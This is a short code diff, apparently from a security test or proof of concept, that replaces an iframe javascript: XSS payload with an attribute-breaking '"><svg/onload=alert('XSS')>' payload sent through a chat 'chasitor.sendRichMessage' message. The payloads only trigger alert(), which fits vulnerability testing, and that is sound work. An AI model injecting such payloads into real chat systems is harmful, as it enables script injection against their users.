@@ -32,7 +32,7 @@
 
       // Wait a bit for scripts to load before attempting XSS
       setTimeout(() => {
-        const payload = `<iframe src="javascript:alert('XSS')">`;
+        const payload = `"><svg/onload=alert('XSS')>`;
 
         const message = {
           method: "chasitor.sendRichMessage",
